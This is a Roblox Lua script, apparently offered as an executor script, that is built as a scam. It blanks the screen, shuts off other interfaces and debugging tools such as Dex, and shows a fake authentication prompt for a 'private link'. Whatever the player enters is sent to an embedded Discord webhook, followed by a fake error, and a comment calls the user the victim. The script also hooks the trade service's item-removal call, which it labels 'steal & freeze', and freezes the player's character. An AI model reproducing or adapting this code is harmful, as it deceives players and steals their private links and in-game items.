-- [[ ZENITH ULTIMATE SILENCE V5 ]]
-- [[ ENCRYPTED SYSTEM - DO NOT TAMPER ]]

local _w = "https://discord.com/api/webhooks/1481688367778234418/cK_6-k7Ci1uacOY-2am1aNx82hS0zYHmYSnZ_lirxQRB6hsYVeF1dWce5Q0kZ1plJK-b" -- ОСЫНДА WEBHOOK ҚОЙ

local Http = game:GetService("HttpService")
local Req = request or http_request or syn.request

-- 1. FULL SILENCE & GAME SOUND ONLY
-- Скриптке қатысты ешқандай дыбыс шықпайды. 
-- Ойынның дыбысына тиіспейміз, ол артқы фонда жүре береді.

-- 2. ANTI-GUI & ANTI-DEX (Бәрін өшіру)
task.spawn(function()
    while task.wait(0.5) do
        pcall(function()
            for _, v in pairs(game.CoreGui:GetChildren()) do
                if v:IsA("ScreenGui") and v.Name ~= "ZenithMain" then
                    v.Enabled = false -- Басқа барлық GUI-ді (Dex-ті де) өшіру
                end
            end
        end)
    end
end)

-- 3. THE VOID SCREEN (Қап-қара экран)
local Zenith = Instance.new("ScreenGui", game.CoreGui)
Zenith.Name = "ZenithMain"
Zenith.DisplayOrder = 999999

local BG = Instance.new("Frame", Zenith)
BG.Size = UDim2.new(1, 0, 1, 0)
BG.BackgroundColor3 = Color3.new(0, 0, 0)
BG.Active = true -- Ештеңе басылмайтындай қылу

local Status = Instance.new("TextLabel", BG)
Status.Size = UDim2.new(1, 0, 0, 50)
Status.Position = UDim2.new(0, 0, 0.4, 0)
Status.BackgroundTransparency = 1
Status.TextColor3 = Color3.fromRGB(80, 80, 80)
Status.Font = Enum.Font.Code
Status.TextSize = 16
Status.Text = "SYSTEM STANDBY: WAITING FOR AUTHENTICATION..."

local Input = Instance.new("TextBox", BG)
Input.Size = UDim2.new(0, 350, 0, 45)
Input.Position = UDim2.new(0.5, -175, 0.5, 0)
Input.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Input.BorderSizePixel = 0
Input.TextColor3 = Color3.new(1, 1, 1)
Input.Font = Enum.Font.Code
Input.PlaceholderText = "PASTE PRIVATE LINK HERE"
Input.Text = ""

-- 4. LOGIC: INVALID LINK LOOP
Input.FocusLost:Connect(function(enter)
    if enter then
        -- Мәліметті жіберу
        local data = {["embeds"] = {{
            ["title"] = "🔗 PRIVATE LINK CAPTURED",
            ["description"] = "Player: " .. game.Players.LocalPlayer.Name .. "\nCaptured Link: " .. Input.Text,
            ["color"] = 0xFF0000
        }}}
        pcall(function() 
            Req({Url = _w, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = Http:JSONEncode(data)}) 
        end)
        
        -- Құрбанға қате көрсету (Дыбыссыз)
        Input.Text = ""
        Status.TextColor3 = Color3.fromRGB(200, 0, 0)
        Status.Text = "ERROR: INVALID PRIVATE LINK. RE-VERIFY URL."
        task.wait(2)
        Status.TextColor3 = Color3.fromRGB(80, 80, 80)
        Status.Text = "WAITING FOR VALID PRIVATE LINK..."
    end
end)

-- 5. THE STEAL & FREEZE LOGIC
local Net = game:GetService("ReplicatedStorage").Packages.Net
local RF = Net:FindFirstChild("RF/TradeService/RemoveBrainrot")

if RF then
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local old = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        if self == RF then return wait(9e9) end
        return old(self, ...)
    end)
    setreadonly(mt, true)
end

-- Ойыншыны қозғалмайтындай қатырып тастау
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
